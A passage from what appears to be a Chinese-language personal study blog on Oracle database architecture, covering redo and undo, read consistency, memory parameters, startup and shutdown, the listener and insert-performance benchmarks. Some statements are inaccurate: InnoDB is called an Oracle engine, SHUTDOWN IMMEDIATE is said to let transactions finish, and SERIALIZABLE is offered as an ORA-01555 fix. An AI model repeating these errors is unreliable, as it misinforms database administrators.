Process):在归档日志模式下，ARCH进程负责将已填满并归档标记的在线重做日志文件复制到归档存储位置，确保即使原始在线日志被覆盖，重做信息仍然可用，这对于数据库备份和恢复至关重要。在高负载或高可用性要求的系统中，可能有多个ARCH进程并行工作。\n\n\nRAC（Real Application Clusters）是Oracle数据库的一项技术，它允许一个数据库分布在多个服务器上，这些服务器共享相同的数据库实例，并以集群的形式协同工作。RAC架构设计的主要目标是为了提高数据库的可用性、可伸缩性和性能。在RAC环境下，数据库的数据文件、控制文件和重做日志文件等存储在共享存储设备上，所有参与集群的节点都可以访问这些共享资源。每个节点都运行着自己的Oracle实例，包含一个数据库实例进程集合，如LGWR、DBWR、CKPT等，以及前面提到的后台进程。这些实例通过高速互联（如InfiniBand网络）相互通信，协调对数据库的访问和数据修改。RAC的实施和运维相对复杂，需要仔细规划网络、存储和系统资源，以及精细的配置和管理，以确保集群的稳定运行和最佳性能。\n\nLGWR的工作就是将日志缓存区的数据写入到磁盘的REDO日志文件中。完成对更新操作的记录，可用于数据库的异常恢复。因为操作发生是有顺序的，比如建表、插入数据、删除、修改…如果建表操作没有被记录，那么后续所有的操作都无法被执行。LGWR必须顺序的记录这些操作，顺序记录才有意义。因此，LGWR是单线程的。\nLGWR有5条规则，来适应高强度的日志记录工作。\n\n每隔三秒钟，LGWR运行一次。\n任何COMMIT触发LGWR运行一次。\nDBWR要把数据从数据缓存写到磁盘，触发LGWR运行一次。\n日志缓存区满三分之一或记录满1MB,触发LGWR运行一次。\n联机日志文件切换也将触发LGWR。\n\n关于回滚 Rollback还是以 update t set object_id=92 where object_id=29; 为例。前面说过的PGA和共享池区部分省略\n\n想更新object_id&#x3D;29的记录首先就需要查到object_id&#x3D;29的记录，检查object_id&#x3D;29是否在数据缓存区里，不存在则从磁盘中读取到数据缓存区中，这一点和普通的查询语句类似。\n但是这毕竞不是查询语句而是更新语句，于是要做一件和查询语句很不同的事，在回滚表空间的相应回滚段事务表上分配事务槽，从而在回滚表空间分配到空间。该动作需要记录日志写进日志缓存区。\n在数据缓存区中创建object_id&#x3D;29的前镜像，前镜像数据也会写进磁盘的数据文件里（回滚表空间的数据文件)，从缓存区写进磁盘的规律前面已经说过了，由CKPT决定，由LGWR写入，当然也别忘记了这些动作都会记录日志，并将其写进日志缓存区，劳模LGWR还在忙着将日志缓存区的数据写入磁盘形成redo文件呢。\n前面步骤做好了，才允许将object_id&#x3D;29修改为object_id&#x3D;92,这个显然也是要记录进日志缓存区的。\n此时用户如果执行了提交，日志缓存区立即要记录这个提交信息，然后就把回滚段事务标记为非激活INACTIVE状态，表示允许重写。\n如果是执行了回滚呢，Oracle需要从回滚段中将前镜像object_id&#x3D;29的数据读出米，修改数据缓存区，完成回滚。这个过程依然要产生日志，要写数据进日志缓存区。\n\n记录前镜像为什么也需要记录日志？前镜像会记录在SGA的数据缓存区（Undohu缓存区）里，由CKPT触发LGWR数据缓存区写入磁盘。用于准备回滚的前镜像数据的生成其实和普通数据操作差不多，唯一的差别就在于一个是刷新到磁盘的普通文件里，一个是刷新到磁盘的回滚数据文件里。\n普通数据可能会出现事务已经commit，但数据还在数据缓存区中，没有被写入磁盘，数据丢失需要根据redo来进行重做恢复的场景。回滚前镜像数据也是这样，需要记录回滚前镜像数据的相关操作，来应对用户需要回滚，但回滚前镜像数据既不在内存也不在磁盘的情况（比如突然断电）此时回滚，则需要依据记录了前镜像数据的redo日志来重做一次还原前镜像数据的操作。\n下面来看回滚段的相关参数。\nSQL&gt; show parameters undoNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------temp_undo_enabled                    boolean     FALSEundo_management                      string      AUTOundo_retention                       integer     900undo_tablespace                      string      UNDOTBS1\n\nUNDO MANAGEMETN为AUTO表示是自动回滚段管理，回滚段空间不够时可以自动扩展UNDO RETENTION为900的含义是，DML语句需要记录前镜像，当COMMIT后，表示回滚段保留的前镜像被打上了可以覆盖重新使用的标记，但是要在900秒后方可允许UNDO TABLESPACE为UNDOTBS1就不用多解释了，表示回滚段表空间的名字为UNDOTBS1\nUndo日志（回滚日志）和Redo日志（重做日志）共同确保了事务处理的ACID特性（原子性、一致性、隔离性、持久性），特别是在事务管理和数据库恢复过程中。下面详细解释两者的作用：\n\nUndo日志（回滚日志）**事务回滚：**Undo日志记录了事务对数据库所做的修改前的原始数据状态。当一个事务需要被回滚时（例如，事务执行失败或者用户发出了ROLLBACK命令），数据库系统会利用Undo日志来撤销事务中已经执行的所有修改，恢复数据库到事务开始前的一致状态。这一过程保证了事务的原子性，即事务中的所有操作要么全部成功，要么全部失败。**多版本并发控制（MVCC）：**在支持多版本并发控制的数据库（如Oracle的InnoDB存储引擎）中，Undo日志还用来提供历史版本的数据，以便在事务执行期间保持数据的一致视图。这样，即使其他事务已经修改了数据，当前事务仍能看到符合其开始时刻的数据状态，增强了并发控制的能力。\nRedo日志（重做日志）**事务恢复：**Redo日志记录了事务对数据库所做的所有修改操作，包括修改后的数据值、修改类型以及数据所在的位置。在系统发生故障（如电源故障、系统崩溃）之后，数据库可以使用Redo日志来“重做”那些已经完成但还未持久化到磁盘的事务操作，确保数据的持久性。即使在崩溃发生前数据尚未完全写入数据文件，也能通过重做日志恢复到崩溃前的最新状态。**保证数据不丢失：**Redo日志在事务提交时被写入，并且通常会先于实际数据更改持久化到磁盘，以防止在提交过程中出现故障导致的数据丢失。\n\nDML语句不同于查询语句，会改变数据库的数据。除此之外，还会产生用于将来恢复的redo和用于回退的undo。另外还有一个细节就是，由于undo也需要保护，所以还会专门产生保护undo操作的redo。\n一致读的原理查询的结果由查询的那个时刻决定了，后续数据新的变化是不予理睬的。如果不这样，Oracle每次查询的结果都可能会不一样，会导致错误的产生。比如从a向b转钱，两者的余额总和无论何时都应该是一样的。但如果在转钱之前查询余额总和，查询的过程中，钱才转到b的账户中，此时查询的最终结果肯定是错误的。因为oracle不可能回头去查变化后的数据，这样如果一直有变化产生，查询将永远不会结束。\n先介绍两个概念：\n\n系统更改号 SCN,SCN的全称是：System Change Number,这是一个只会增加不会减少的递增数字，存在于Oracle的最小单位块里，当某块改变时SCN就会递增。\n回滚段记录事务槽（）（前面我在描述回滚的时候提过，事务槽是用来分配回滚空间的)，如果你更新了某块，事务就被写进事务槽里。如果未提交或者回滚，该块就存在活动事务，数据库读到此块可以识别到这种情况的存在。\n\n当开始查询时，首先会获取查询时刻的SCN号。查询过程中会比较查询时刻的SCN号与当前数据块头部的ITL槽内的SCN号（如果有多个ITL槽，取最大的SCN号）如果查询时刻的SCN号大于ITL槽内的SCN号，说明该块的数据在这段时间没有被更新，可以放心地正常全部读。如果查询时刻的SCN号小于ITL槽内的SCN号，说明该块的数据在这段时间被更新了，需要根据ITL槽中记录的对应的undo块的地址找到undo块，将undo块中记录的修改前的数据取出。\n不过并不是查询开始的SCN大于等于查询中所有块的SCN就一定可以直接获取数据。因为当前镜像数据c从回滚段中找不回来时，这个查询将会以 ORA-01555: Snapshot too old 的错误终止。查询失败，也不会返回一个错误的查询结果。\n\nORA-01555 错误，正式名称为”Snapshot Too Old”（快照过旧），是Oracle数据库中常见的错误之一。这个错误通常发生在执行查询或事务处理期间，数据库无法为查询结果提供足够旧的一致性读取快照，导致查询失败。这意味着数据库无法确保查询结果反映的是查询开始那一刻的数据状态，违反了读一致性原则。\n触发条件：\n\nUndo表空间大小不足：如果数据库配置的Undo表空间大小较小，不足以存放长时间运行查询期间产生的undo信息，旧的undo记录可能会被新事务产生的undo信息覆盖。\n长查询与高并发更新：在查询执行过程中，如果有大量其他事务并发地对报表查询所涉及的数据表进行更新或删除操作，这将迅速消耗undo空间，可能导致查询所需的undo记录被提前清理。\nUndo_RETENTION设置不当：即使Undo表空间足够大，但如果Undo_RETENTION参数设置得过低，数据库也可能过早地回收undo信息，即使undo空间仍有空闲。\n\n解决方案：\n\n增加Undo表空间的大小。\n调整Undo_RETENTION参数以延长undo数据的保留时间。\n优化长查询，减少查询执行时间。\n使用绑定变量，减少硬解析，从而减少undo的生成。\n在合适的情况下，考虑使用较大的隔离级别，如SERIALIZABLE，尽管这可能会影响并发性能。\n\n\n早期的SQL Server的数据库版本，是读产生锁，在读数据时表就被锁住，这样确实是不存在问题了，不过如果读表会让表锁住，那数据库的并发会非常的糟糕。早期的其他数据库版本也有边读边锁的，比如已经读过的记录就允许被修改，而未读过的数据却是被锁住的，不允许修改，这虽然稍稍有些改进，只锁了表的部分而非全部，但是还是读产生锁，非常糟糕。而Oracle的回滚段，却解决了读一致性的问题，又避免了锁，大大增强了数据库并发操作的能力。\n实践内存查看 sga 内存区大小\nSQL&gt; show parameters sgaNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------allow_group_access_to_sga            boolean     FALSElock_sga                             boolean     FALSEpre_page_sga                         boolean     TRUEsga_max_size                         big integer 1536Msga_min_size                         big integer 0sga_target                           big integer 1536M\n\n查看 pga 内存区大小\nSQL&gt; show parameters pgaNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------pga_aggregate_limit                  big integer 2Gpga_aggregate_target                 big integer 512M\n\n查看 共享池 大小\nSQL&gt; show parameters shared_pool_sizeNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------shared_pool_size                     big integer 0\n\n查看 数据缓存区 大小\nSQL&gt; show parameters db_cache_sizeNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------db_cache_size                        big integer 0\n\n会发现，共享池和数据缓存区的大小都为0因为这里Oracle设置为SGA自动管理，共享池和数据缓存区的大小分配由之前的SGA MAX SIZE和SGA TARGET决定，总的大小为1536M它们分别被分配多少由Oracle来决定，无须我们人工干预，其中SGA TARGET不能大于SGA MAX SIZE。\n二者有什么差别呢？举个例子比如SGA TARGET:&#x3D;2G,而SGA MAX SIZE&#x3D;8G,表示数据库正常运行情况下操作系统只分配2G的内存区给Oracle使用，而这2G就是共享池和数据缓存区等内存组件分配的大小可是运行中发现内存不够用，这时OS可以再分配内存给SGA,但是最大不可以超过8G。\n一般情况下都建议使用SGA内存大小自动分配的原则，如果一定要手工分配也行，把SGA TARGET设置为O,再把SHARED POOL SIZE和DB CACHE SIZE设置为非O,就可以了。在启用自动管理时，数据库管理员不需要手动设置各个SGA组件（如共享池、数据缓冲区、大型池、Java池等）的确切大小。相反，管理员会设置一个总的SGA目标大小（如通过SGA_TARGET参数），或者在使用AMM时，设置一个总的内存目标大小（MEMORY_TARGET），包括SGA和PGA（Program Global Area，程序全局区）。Oracle数据库根据当前的工作负载和需求动态调整各个组件的大小，以优化资源使用和性能。\n可以使用 ipcs -m 的查看共享内存的命令：\nbash-4.4$ ipcs -m------ Shared Memory Segments --------key        shmid      owner      perms      bytes      nattch     status      0x00000000 0          oracle     600        5361664    102                     0x00000000 1          oracle     600        1593835520 51                      0x00000000 2          oracle     600        4530176    51                      0xf2c898a4 3          oracle     600        20480      51  \n\n\nipcs -m 是一个在Linux系统中用于显示内存共享段信息的命令。ipcs 命令是一个用于报告进程间通信（IPC）设施状态的实用程序，包括消息队列、信号量集和共享内存段。当加上 -m 选项时，它专门针对共享内存进行操作，显示当前系统中所有共享内存段的详细信息。共享内存是进程间通信的一种高效方式，允许多个进程直接访问同一块内存区域，从而快速交换数据。ipcs -m 输出的信息通常包括如下几列：\n\nKey：共享内存段的键值，用于标识共享内存段。\nshmid：共享内存段的ID。\nOwner：创建共享内存段的用户ID。\nPerms：共享内存段的权限。\nBytes：共享内存段的大小（字节数）。\nNattch：当前连接到该共享内存段的进程数。\nStatus：共享内存段的状态，比如是否被附加（attached）。\nctime：共享内存段创建的时间。\nmtime：共享内存段最后一次修改的时间。\n\n\n查看 日志缓存区 大小\nSQL&gt; show parameters log_bufferNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------log_buffer                           big integer 4192K\n\n一般日志缓冲区满三分之一便会触发LGWR，将缓冲区中的内容写入磁盘，以确保有足够的空间供新的重做记录使用。\n那该如何修改这些设置呢？具体命令如下：使用 alter system set &lt;parameter_name&gt;=&lt;value&gt; scope=memory|spfile both [sid=&lt;sid_name&gt;] 命令可以动态修改许多系统参数。其中 scope 参数表示其作用范围和持久性，它有三个枚举值。\n\nmemory:只改变当前实例运行，重新启动数据库后失效。\nspfile:只改变spfile的设置，不改变当前实例运行，重新启动数据库后生效。\nboth（默认值）:同时改变实例及spfile,当前更改立即生效，重新启动数据库后仍然有效。\n\n可以通过 ALTER SYSTEM 或者导入导出来更改 spfile 的内容。针对RAC环境，ALTER SYSTEM 还可以指定SD参数，对不同实例进行不同的设置。\n\n如果当前实例使用的是pfle而非spfile,则scope&#x3D;-spfile或scope–both会产生错误\n如果实例以pfle启动，则scope的默认值为memory,若以spfile启动，则默认值为both\n有些参数（静态参数）必须重启才能生效，如log buffer\n\n进程Oracle数据库是由实例和一组数据库文件组成的，实例则是由Oracle开辟的内存区和一组后台进程组成的。\n下面登录Oracle数据库环境，来看一下这些后台进程。这里登录的环境是Linux&#x2F;UNIX环境，因为Windows环境中Oracle是多线程形式的，不好查看。而UNIX环境是多进程形式的，更方便查看。\n查看 实例名称\nSQL&gt; show parameters instance_nameNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------instance_name                        string      FREE\n\n使用实例名称来过滤，比使用oracle更加精准。\nbash-4.4$ ps -ef|grep FREE  oracle        33       1  0 Jul16 ?        00:00:33 db_pmon_FREEoracle        37       1  0 Jul16 ?        00:00:06 db_clmn_FREEoracle        41       1  0 Jul16 ?        00:00:48 db_psp0_FREEoracle        45       1  0 Jul16 ?        00:00:52 db_vktm_FREEoracle        51       1  0 Jul16 ?        00:00:19 db_gen0_FREEoracle        55       1  0 Jul16 ?        00:00:10 db_mman_FREEoracle        61       1  0 Jul16 ?        00:00:09 db_gen2_FREEoracle        63       1  0 Jul16 ?        00:00:10 db_diag_FREEoracle        65       1  0 Jul16 ?        00:00:08 db_ofsd_FREEoracle        69       1  0 Jul16 ?        00:00:14 db_gwpd_FREEoracle        71       1  0 Jul16 ?        00:01:24 db_dbrm_FREEoracle        73       1  0 Jul16 ?        00:10:04 db_vkrm_FREEoracle        75       1  0 Jul16 ?        00:00:38 db_pman_FREEoracle        78       1  0 Jul16 ?        00:01:42 db_dia0_FREEoracle        81       1  0 Jul16 ?        00:00:28 db_dbw0_FREEoracle        83       1  0 Jul16 ?        00:00:28 db_lgwr_FREEoracle        85       1  0 Jul16 ?        00:00:54 db_ckpt_FREEoracle        87       1  0 Jul16 ?        00:00:05 db_smon_FREEoracle        90       1  0 Jul16 ?        00:00:19 db_smco_FREEoracle        96       1  0 Jul16 ?        00:00:03 db_reco_FREEoracle       102       1  0 Jul16 ?        00:00:11 db_lreg_FREEoracle       109       1  0 Jul16 ?        00:00:10 db_pxmn_FREEoracle       115       1  0 Jul16 ?        00:01:06 db_mmon_FREEoracle       117       1  0 Jul16 ?        00:01:00 db_mmnl_FREEoracle       121       1  0 Jul16 ?        00:01:55 db_bg00_FREEoracle       123       1  0 Jul16 ?        00:00:09 db_w000_FREEoracle       131       1  0 Jul16 ?        00:00:47 db_bg01_FREEoracle       137       1  0 Jul16 ?        00:00:53 db_bg02_FREEoracle       146       1  0 Jul16 ?        00:00:03 db_d000_FREEoracle       148       1  0 Jul16 ?        00:00:02 db_s000_FREEoracle       150       1  0 Jul16 ?        00:00:03 db_tmon_FREEoracle       152       1  0 Jul16 ?        00:00:08 db_rcbg_FREEoracle       159       1  0 Jul16 ?        00:00:03 db_tt00_FREEoracle       162       1  0 Jul16 ?        00:00:08 db_tt01_FREEoracle       166       1  0 Jul16 ?        00:00:08 db_p000_FREEoracle       254       1  0 Jul16 ?        00:00:03 db_aqpc_FREEoracle       381       1  0 Jul16 ?        00:19:13 db_cjq0_FREEoracle       423       1  0 Jul16 ?        00:00:04 db_qm02_FREEoracle       427       1  0 Jul16 ?        00:00:02 db_q002_FREEoracle       431       1  0 Jul16 ?        00:00:06 db_q004_FREEoracle       478       1  0 Jul16 ?        00:00:09 db_w001_FREEoracle      1007    1006  0 Jul16 ?        00:00:00 oracleFREE (DESCRIPTION=(LOCAL=YES)(ADDRESS=(PROTOCOL=beq)))oracle      4550       1  0 Jul16 ?        00:00:04 oracleFREE (LOCAL=NO)oracle     44919       1  0 Jul17 ?        00:00:00 oracleFREE (LOCAL=NO)oracle     45470       1  0 Jul17 ?        00:00:00 oracleFREE (LOCAL=NO)oracle     65331       1  0 Jul17 ?        00:00:00 oracleFREE (LOCAL=NO)oracle    120778       1  0 Jul18 ?        00:01:20 db_m005_FREEoracle    121022       1  0 Jul18 ?        00:01:20 db_m004_FREEoracle    123426       1  0 Jul18 ?        00:01:17 db_m003_FREEoracle    125755       1  0 Jul18 ?        00:01:18 db_m000_FREEoracle    167946       1  0 10:41 ?        00:00:00 oracleFREE (LOCAL=NO)oracle    171135       1  0 11:58 ?        00:00:12 db_m006_FREEoracle    178882  170338  0 15:05 pts/6    00:00:00 grep FREE\n\n这里可以看到有很多前面介绍的进程，比如lgwr。LOCAL&#x3D;NO 表示非Oracle本身的进程，是通过其他用户通过监听连接进数据库进行访问的。\n这里缺少了一个重要的进程，ARCH归档进程。当日志循环写入过程中会出现下一个日志已经被写过的情况，再继续写将会覆盖其内容，需要将这些即将被覆盖的内容写出到磁盘里去形成归档文件。这样日志记录不会丢失，将来数据库就可以从这些日志文件和归档文件中进行数据库的恢复处理。不过这个归档并非总是必要的。\nSQL&gt; archive log list Database log mode              No Archive ModeAutomatic archival             DisabledArchive destination            /opt/oracle/product/23ai/dbhomeFree/dbs/archOldest online log sequence     8Current log sequence           6\n\n可以看到 No Archive Mode 数据库归档是关闭的。更改数据库归档模式需要重启数据库，将数据库置于mount状态后，输入alter database archivelog(如果是归档改为非归档，这里是alter database noarchivelog)然后再开启数据库alter database open,才可以将数据库更改为非归档，具体步骤如下（这里就不一一执行了）：\n\nSQL&gt; shutdown immediate;  – 关闭数据库\nstartup mount; – 启动数据库实例，并将数据库装载（mount）到实例中，但不打开（open）数据库。\nalter database archivelog; – 将数据库从非归档模式转换为归档模式\nalter database open; – 打开数据库\n\n启停参数文件及控制文件和数据库的启动与关闭是息息相关的，数据库的启动可分为三个阶段，分别是nomount、mount和open。在启动的过程中可以直接输入startup启动，也可以分成startup nomount、startup mount和alter database open三步分别启动。\n\nSTARTUP NOMOUNT：\n\n此阶段初始化Oracle实例，但不装载数据库的任何数据文件或控制文件。主要用于配置参数、分配内存结构等初始化工作。\n读取参数文件（PFILE&#x2F;SPFILE），分配SGA（系统全局区），启动后台进程。\n\n\nSTARTUP MOUNT：\n\n装载数据库但不打开。此时，控制文件被读取，数据库结构被识别，但数据文件保持关闭状态。\n除了NOMOUNT阶段的工作，还会装载控制文件，验证数据文件和联机重做日志文件的存在和一致性。\n\n\nALTER DATABASE OPEN：\n\n打开数据库，使其对用户可用。数据文件被打开，检查点信息被处理，必要时进行恢复操作。\n打开数据文件，应用重做日志以确保数据的一致性，启动必要的后台进程，解锁数据库供用户访问。\n\n\nSTARTUP RESTRICT（可选）：\n\n以受限模式打开数据库，仅允许特定用户（如DBA）连接，常用于维护操作。\n类似OPEN，但限制了连接数据库的用户权限。\n\n\nSTARTUP FORCE（可选）：\n\n强制关闭数据库（如果已打开）并重新启动。适用于数据库不能正常关闭的情况。\n相当于执行了SHUTDOWN ABORT followed by STARTUP。\n\n\n\n总结起来，nomount阶段仅需一个参数文件即可成功，mount阶段要能够正常读取到控制文件才能成功。而opn阶段需要保证所有的数据文件和日志文件等需要和控制文件里记录的名称和位置一致，能被锁定访问更新的同时还要保证没有损坏，否则数据库的ope阶段就不可能成功。\n关闭是启动的逆过程首先把数据库关闭，然后数据库和实例之间DISMOUNT，最后实例关闭。这里三个阶段都在一个命令中完成，如下：\n\nSHUTDOWN NORMAL：\n\n平缓关闭数据库，等待所有用户断开连接后才关闭，确保数据完整性和一致性。\n阻止新连接，等待当前所有会话完成，执行检查点，关闭数据库和实例。\n\n\nSHUTDOWN TRANSACTIONAL：\n\n类似于NORMAL，但在所有事务结束前不等待长时间运行的查询。\n比NORMAL更快关闭，但保证所有事务完成。\n\n\nSHUTDOWN IMMEDIATE：\n\n立即关闭，不等待用户会话完成，但允许当前事务完成。\n终止所有非系统会话，允许当前事务快速提交或回滚后关闭。\n\n\nSHUTDOWN ABORT：\n\n紧急关闭，不执行任何清理工作，可能导致未提交的事务丢失和需要实例恢复。\n立即终止所有会话，不执行检查点或事务回滚，可能导致数据库需要恢复。\n\n\n\n文件没有参数文件，实例无法创建，数据库无法NOMOUNT成功没有控制文件，数据库无法 MOUNT没有数据文件，数据库无法打开使用（此外没有了数据文件，那数据也没地方保存了，数据库也失去意义了)没有日志和归档文件，数据库就失去了保护伞，变得很不安全了。\n参数文件位置\nSQL&gt; show parameters spfileNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------spfile                               string      /opt/oracle/product/23ai/dbhom                                                 eFree/dbs/spfileFREE.ora\n\n控制文件位置\nSQL&gt; show parameters controlNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------control_file_record_keep_time        integer     7control_files                        string      /opt/oracle/oradata/FREE/contr                                                 ol01.ctl, /opt/oracle/oradata/                                                 FREE/control02.ctlcontrol_management_pack_access       string      DIAGNOSTIC+TUNINGdiagnostics_control                  string      IGNORE\n\n数据文件位置\nSQL&gt; select file_name from DBA_DATA_FILES;FILE_NAME--------------------------------------------------------------------------------/opt/oracle/oradata/FREE/users01.dbf/opt/oracle/oradata/FREE/undotbs01.dbf/opt/oracle/oradata/FREE/system01.dbf/opt/oracle/oradata/FREE/sysaux01.dbf\n\n日志文件位置\nSQL&gt; select group#,member from v$logfile;    GROUP# MEMBER---------- ----------------------------------------------------------------------         3 /opt/oracle/oradata/FREE/redo03.log         2 /opt/oracle/oradata/FREE/redo02.log         1 /opt/oracle/oradata/FREE/redo01.log\n\n归档文件位置（这里未开启归档模式，所以没有归档文件）\nSQL&gt; show parameters recoveryNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------_instance_recovery_bloom_filter_size integer     1048576db_recovery_auto_rekey               string      ONdb_recovery_file_dest                stringdb_recovery_file_dest_size           big integer 0recovery_parallelism                 integer     0remote_recovery_file_dest            stringtransaction_recovery                 string      ENABLED\n\n告警日志文件\nSQL&gt; show parameters dumpNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------background_core_dump                 string      partialbackground_dump_dest                 string      /opt/oracle/product/23ai/dbhom                                                 eFree/rdbms/logcore_dump_dest                       string      /opt/oracle/diag/rdbms/free/FR                                                 EE/cdumpmax_dump_file_size                   string      32Mshadow_core_dump                     string      partialuser_dump_dest                       string      /opt/oracle/product/23ai/dbhom                                                 eFree/rdbms/log\n\n监听如果想在远程A机器上通过网络访问本地B机器上的数据库，B机器上的数据库必须开启监听。远程的A机器只需安装数据库客户端，然后通过读取A机器上数据库客户端配置的TNSNAMES.ORA的配置文件，即可连接并访问B机器的数据库。下面介绍监听状态的查看，监听的开启，以及监听的关闭。以下Isnrctl status命令是查看监听的状态命令，其中 Listener Parameter File 和 Listener Log File 定位了监听文件listener.ora以及对应的日志。\nbash-4.4$ lsnrctl statusLSNRCTL for Linux: Version 23.0.0.0.0 - Production on 25-JUL-2024 20:16:51Copyright (c) 1991, 2024, Oracle.  All rights reserved.Connecting to (DESCRIPTION=(ADDRESS=(PROTOCOL=IPC)(KEY=EXTPROC_FOR_FREE)))STATUS of the LISTENER------------------------Alias                     LISTENERVersion                   TNSLSNR for Linux: Version 23.0.0.0.0 - ProductionStart Date                16-JUL-2024 15:25:32Uptime                    9 days 4 hr. 51 min. 19 secTrace Level               offSecurity                  ON: Local OS AuthenticationSNMP                      OFFDefault Service           FREEListener Parameter File   /opt/oracle/product/23ai/dbhomeFree/network/admin/listener.oraListener Log File         /opt/oracle/diag/tnslsnr/oracle/listener/alert/log.xmlListening Endpoints Summary...  (DESCRIPTION=(ADDRESS=(PROTOCOL=ipc)(KEY=EXTPROC_FOR_FREE)))  (DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=0.0.0.0)(PORT=1521)))Services Summary...Service &quot;16df542da83f091ce0630500580a27e7&quot; has 1 instance(s).  Instance &quot;FREE&quot;, status READY, has 1 handler(s) for this service...Service &quot;FREE&quot; has 1 instance(s).  Instance &quot;FREE&quot;, status READY, has 1 handler(s) for this service...Service &quot;FREEXDB&quot; has 1 instance(s).  Instance &quot;FREE&quot;, status READY, has 1 handler(s) for this service...Service &quot;PLSExtProc&quot; has 1 instance(s).  Instance &quot;PLSExtProc&quot;, status UNKNOWN, has 1 handler(s) for this service...Service &quot;freepdb1&quot; has 1 instance(s).  Instance &quot;FREE&quot;, status READY, has 1 handler(s) for this service...The command completed successfully\n\n关闭监听 lsnrctl stop关闭监听 lsnrctl start\n体会 sql 性能差异未优化前，单车速度使用以下存储过程，实现将1到10万插入到t表中。\ncreate or replace procedure proc1asbegin    for i in 1..100000        loop            execute immediate                &#x27;insert into t values (&#x27;||i||&#x27;)&#x27;;            commit;        end loop;end;-- 这里要记得先预先执行一遍，将过程创建起来！\n\n初始化表结构、清空共享池、开启计时等。每次执行存储过程前重置，以便观察各个存储的性能。后续省略\nSQL&gt; drop table t purge;Table dropped.Elapsed: 00:00:00.45SQL&gt; create table t(x int);Table created.Elapsed: 00:00:00.15SQL&gt; alter system flush shared_pool;System altered.Elapsed: 00:00:01.28SQL&gt; set timing on\n\nSQL&gt; exec proc1;PL/SQL procedure successfully completed.Elapsed: 00:00:53.68SQL&gt; select count(*) from t;  COUNT(*)----------    100000Elapsed: 00:00:00.09\n\n耗时53秒68，每秒两千条不到。\n共享池中缓存下来的SQL语句以及HASH出来的唯一值，都可以在v$sql中对应的 SQL_TEXT 和 SQL_ID 字段中查询到而解析的次数和执行的次数分别可以从 PARSE_CALL 和 EXECUTIONS 字段中获取。由于这个过程PROC1执行的是 insert into t 的系列插入，于是我们执行如下语句来查询PROC1在数据库共享池中执行的情况，具体如下：\nselect t.sql_text,t.sql_id,t.PARSE_CALLS,t.EXECUTIONSfrom v$sql twhere sql_text like &#x27;%insert into t values%&#x27;;\n\n\n可以看到共享池中有大量相似的sql，他们的sql_id都不一样，每个语句都被解析了一次、执行了一次。这些sql都是高度相似的，如果这些语句都能合并成一种写法，不是就可以只解析一次，然后执行十万次，节省了解析的时间。\n绑定变量，摩托速度create or replace procedure proc2asbegin    for i in 1..100000        loop            execute immediate                &#x27;insert into t values (:x)&#x27; using i;            commit;        end loop;end;\n\nSQL&gt; exec proc2;PL/SQL procedure successfully completed.Elapsed: 00:00:03.50\n\n耗时3秒50，每秒八千多条。看来sql的解析还是很耗时的。\n\n静态改写，汽车速度execute immediate 是一种动态SQL的写法，常用于表名字段名是变量、入参的情况，由于表名都不知道，所以当然不能直接写SQL语句了。所以要靠动态SQL语句根据传入的表名参数，来拼成一条SQL语句，由 execute immediate 调用执行。但是这里显然不需要多此一举，因为insert into t values()完全可以满足需求，表名就是t，是确定的。\ncreate or replace procedure proc3asbegin    for i in 1..100000        loop            insert into t values (i);            commit;        end loop;end;\n\nSQL&gt; exec proc3;PL/SQL procedure successfully completed.Elapsed: 00:00:03.19\n\n耗时3秒19，又快了一些。\n一般来说，静态SQL会自动使用绑定变量\n从执行情况可以看到proc3也实现了绑定变量，而且动态SQL的特点是执行过程中再解析，而静态SQL的特点是编译的过程就解析好了。这点差别就是速度再度提升的原因。\n批量提交，动车速度commit 放在里面意味着每插入1条，就要提交1次，那放在循环里就要提交10万次，而放在循环外就是全部插入完后提交1次。commit 触发 LGWR 将 REDO BUFFER 写出到 REDO LOG 中，并且将回滚段的活动事务标记为不活动，同时让回滚段中记录对应前镜像记录的所在位置标记为可以重写。切记 commit 可不是写数据的动作，写数据将数据从 DATA BUFFER 刷出磁盘是由 CKPT。\nSQL&gt; exec proc4;PL/SQL procedure successfully completed.Elapsed: 00:00:03.02\n\n集合写法，飞机速度insert into t select rownum from dual connect by level&lt;=100000;\nSQL&gt; insert into t select rownum from dual connect by level&lt;=100000;100000 rows created.Elapsed: 00:00:00.14\n\n耗时仅0.14秒因为原先的过程变为了sql，一条条插入的语句变成了一个集合的概念，变成了一整批地写进 DATA BUFFER 区里。好比你要运砖头到目的地，一种是一块砖头拿到目的地，再返回拿第二块，直到拿完全部。而另一种是全部放在板车一起推至目的地，只是这里的目的地是 DATA BUFFER 区而已。\n直接路径，火箭速度时间已经很小了，这时可能会有误差，所以将数据量放大到200万。没加太大是因为我这小服务器内存不够\nSQL&gt; insert into t select rownum from dual connect by level&lt;=2000000;2000000 rows created.Elapsed: 00:00:01.74\n\n耗时1.74秒。\n下面使用 create table 的直接路径方式来新建t表。create table t as select rownum x from dual connect by level&lt;=2000000;\nSQL&gt;  create table t as select rownum x from dual connect by level&lt;=2000000;Table created.Elapsed: 00:00:01.73\n\n区别不是很大，可能因为数据量的关系。\n并行设置，飞船速度最后，如果遇到性能好的机器，还是可以大幅度提升性能的。设置日志关闭 nologging 并且设置 parallel 4 表示用到机器的4个CPU。这里还是受限于机器了\nSQL&gt; create table t nologging parallel 4 as select rownum x from dual connect by level&lt;=2000000;Table created.Elapsed: 00:00:01.74\n\n\nOracle 环境的搭建中间有段时间没有连着写，是去搭建Oracle环境了。毕竟公司的测试环境没有dba权限，还是自己搭一个比较好。这里为了方便，采用官方的docker镜像进行部署。\n首先用 docker pull container-registry.oracle.com/database/free:latest 拉取镜像。镜像比较大，需要等一段时间。确保磁盘有足够的空间，我这里拉取的镜像id是 7510f8869b04如果下载过慢，或者内存不足，可以参考下面修改docker的配置文件 sudo vim /etc/docker/daemon.json\n&#123;  &quot;data-root&quot;: &quot;/new_dir/docker&quot;,  &quot;registry-mirrors&quot;: [    &quot;http://hub-mirror.c.163.com&quot;  ]&#125;\n\ndata-root 